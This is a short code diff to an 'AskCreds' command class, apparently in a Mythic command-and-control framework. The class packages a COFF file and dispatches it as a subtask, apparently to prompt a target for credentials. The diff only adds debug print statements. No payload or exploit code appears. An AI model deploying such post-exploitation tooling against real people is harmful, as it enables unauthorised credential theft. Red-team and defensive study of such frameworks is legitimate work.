@@ -108,6 +108,7 @@ class AskCredsCommand(CommandBase):
             encoded_file = base64.b64encode(coff_file.read())
 
         # Upload the COFF file to Mythic, delete after using so that we don't have a bunch of wasted space used
+        print("Uploading COFF file")
         file_resp = await MythicRPC().execute("create_file",
                                     task_id=task.id,
                                     file=encoded_file,
@@ -117,7 +118,9 @@ class AskCredsCommand(CommandBase):
         OfArgs = []
         reason = task.args.get_arg("reason")
         OfArgs.append(generateWString(reason))
+        print("Encoding Args")
         encoded_args = base64.b64encode(SerialiseArgs(OfArgs))
+        print(encoded_args)
         # Pack our argument into our buffer using BeaconPack (You'll do this multiple times for each parameter)
         #bp.addWstr(task.args.get_arg("path"))
 
@@ -129,6 +132,7 @@ class AskCredsCommand(CommandBase):
         #   the functionName which in this case is go
         #   the number of arguments we packed which in this task is 1
         #   the argumentData which is the string representation of the hex output provided from bp.getbuffer()
+        print("Requesting subtask")
         resp = await MythicRPC().execute("create_subtask_group", tasks=[
             {"command": "coff", "params": {"coffFile":file_resp.response["agent_file_id"], "functionName":"go","arguments": encoded_args, "timeout":"30"}},
             ], 
